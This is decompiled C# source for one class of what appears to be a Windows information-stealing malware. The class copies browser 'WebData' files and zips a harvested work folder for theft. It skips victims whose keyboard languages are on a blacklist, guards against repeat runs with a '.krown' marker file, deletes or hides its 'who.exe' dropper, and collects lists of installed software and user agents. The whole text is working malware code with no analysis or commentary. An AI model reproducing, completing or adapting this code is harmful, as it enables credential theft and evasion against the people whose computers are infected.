using System;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using who;

// Token: 0x0200002C RID: 44
internal class Class16
{
	// Token: 0x06000161 RID: 353 RVA: 0x0000C8B8 File Offset: 0x0000AAB8
	public static void smethod_0(DirectoryInfo directoryInfo_0)
	{
		try
		{
			foreach (FileInfo fileInfo in directoryInfo_0.GetFiles())
			{
				fileInfo.Delete();
			}
			foreach (DirectoryInfo directoryInfo in directoryInfo_0.GetDirectories())
			{
				Class16.smethod_0(directoryInfo);
				directoryInfo.Delete();
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000162 RID: 354 RVA: 0x0000C928 File Offset: 0x0000AB28
	public static void smethod_1(string string_1, string string_2)
	{
		if (File.Exists(string_2))
		{
			try
			{
				string path = Path.Combine(new string[]
				{
					Dirs.WebData
				});
				if (new FileInfo(string_2).Length != 0L)
				{
					File.Copy(string_2, Path.Combine(path, Path.GetFileName(string_2)), true);
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000163 RID: 355 RVA: 0x0000C998 File Offset: 0x0000AB98
	[CompilerGenerated]
	private static ManagementObject smethod_2(string string_1)
	{
		ManagementClass managementClass = new ManagementClass(string_1);
		foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
		{
			ManagementObject managementObject = (ManagementObject)managementBaseObject;
			if (managementObject != null)
			{
				return managementObject;
			}
		}
		return null;
	}

	// Token: 0x06000164 RID: 356 RVA: 0x0000CA00 File Offset: 0x0000AC00
	public static string smethod_3()
	{
		try
		{
			ManagementObject managementObject = Class16.smethod_2("Win32_OperatingSystem");
			if (managementObject == null)
			{
				return string.Empty;
			}
			return managementObject["Version"] as string;
		}
		catch
		{
		}
		return Class16.smethod_3();
	}

	// Token: 0x06000165 RID: 357 RVA: 0x0000CA54 File Offset: 0x0000AC54
	public static void smethod_4()
	{
		foreach (object obj in InputLanguage.InstalledInputLanguages)
		{
			InputLanguage inputLanguage = (InputLanguage)obj;
			string text = Convert.ToString(inputLanguage.Culture);
			foreach (string value in Dirs.BlackList)
			{
				if (text.Contains(value))
				{
					Class16.MeHrHinQr8();
					Environment.Exit(0);
				}
			}
		}
	}

	// Token: 0x06000166 RID: 358 RVA: 0x0000CAE8 File Offset: 0x0000ACE8
	public static void smethod_5()
	{
		try
		{
			if (File.Exists(Dirs.Temp + "\\" + Environment.UserName + ".krown"))
			{
				Class16.MeHrHinQr8();
				Environment.Exit(0);
			}
			else
			{
				File.Create(Dirs.Temp + "\\" + Environment.UserName + ".krown");
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000167 RID: 359 RVA: 0x0000CB58 File Offset: 0x0000AD58
	public static void smethod_6()
	{
		string destinationArchiveFileName = string.Concat(new string[]
		{
			Dirs.Temp,
			"\\",
			Class28.string_0,
			"_",
			Class28.string_1,
			".zip"
		});
		try
		{
			ZipFile.CreateFromDirectory(Dirs.WorkDir, destinationArchiveFileName, CompressionLevel.Optimal, false);
		}
		catch
		{
		}
	}

	// Token: 0x06000168 RID: 360 RVA: 0x0000CBC4 File Offset: 0x0000ADC4
	public static void MeHrHinQr8()
	{
		try
		{
			File.Delete(Dirs.Temp + "\\who.exe");
		}
		catch
		{
			File.SetAttributes(Dirs.Temp + "\\who.exe", FileAttributes.Hidden);
		}
	}

	// Token: 0x06000169 RID: 361 RVA: 0x0000CC10 File Offset: 0x0000AE10
	public static void smethod_7()
	{
		DirectoryInfo directoryInfo_ = new DirectoryInfo(Dirs.WorkDir);
		Class16.smethod_0(directoryInfo_);
		Class17.smethod_0();
		File.Delete(string.Concat(new string[]
		{
			Dirs.Temp,
			"\\",
			Class28.string_0,
			"_",
			Class28.string_1,
			".zip"
		}));
	}

	// Token: 0x0600016A RID: 362 RVA: 0x0000CC74 File Offset: 0x0000AE74
	public static void smethod_8()
	{
		if (Class28.list_1.Count > 0)
		{
			for (int i = 0; i < Class28.list_1.Count; i++)
			{
				Class16.string_0 += Class28.list_1[i];
			}
		}
	}

	// Token: 0x0600016B RID: 363 RVA: 0x0000CCC4 File Offset: 0x0000AEC4
	public static void smethod_9()
	{
		if (Dirs.LogPC.Count > 0)
		{
			Class16.string_0 += "\r\n<===| SOFT |===>";
			for (int i = 0; i < Dirs.LogPC.Count; i++)
			{
				Class16.string_0 = Class16.string_0 + "\r\n" + Dirs.LogPC[i];
			}
		}
	}

	// Token: 0x0600016C RID: 364 RVA: 0x0000CD2C File Offset: 0x0000AF2C
	public static void smethod_10()
	{
		if (Class28.list_0.Count > 0)
		{
			Class16.string_0 += "\r\n<===| UserAgents |===>";
			for (int i = 0; i < Class28.list_0.Count; i++)
			{
				Class16.string_0 = Class16.string_0 + "\r\n" + Class28.list_0[i];
			}
		}
	}

	// Token: 0x0600016D RID: 365 RVA: 0x0000276F File Offset: 0x0000096F
	public Class16()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x0600016E RID: 366 RVA: 0x00002AC1 File Offset: 0x00000CC1
	// Note: this type is marked as 'beforefieldinit'.
	static Class16()
	{
		Class34.A1SfXVPz7w9eh();
		Class16.string_0 = "\r\n";
	}

	// Token: 0x04000096 RID: 150
	public static string string_0;
}
